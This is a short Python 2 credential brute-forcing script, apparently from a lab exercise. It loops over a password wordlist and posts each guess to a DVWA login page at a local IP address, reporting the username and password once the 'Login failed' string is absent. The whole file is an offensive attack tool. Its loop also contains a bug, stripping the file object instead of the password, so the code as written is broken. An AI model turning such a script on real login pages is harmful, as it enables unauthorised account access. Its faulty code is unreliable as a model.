#!/usr/bin/python

import requests


def bruteforce(username, url):
    for password in passwords:
        password = passwords.strip('\n')
        print("[!!] Trying to bruteforce with password: " + password)
        #name and value of the html login form fields
        data_dictionary = {"username":username, "password":password, "Login":"submit"}
        response = requests.post(url, data=data_dictionary)
        # must be exact failure string on web page
        if "Login failed" in response.content:
            pass
        else:
            print("[+] Username: ==> " + username)
            print("[+] Password: ==> " + password)
            exit()


# url with login page
page_url = "http://10.0.0.1/dvwa/login.php"
username = raw_input("* Enter username for specified page: ")

with open("passwordlist.txt", "r") as passwords:
    bruteforce(username, page_url)


print("[!!] Password is not in this list.")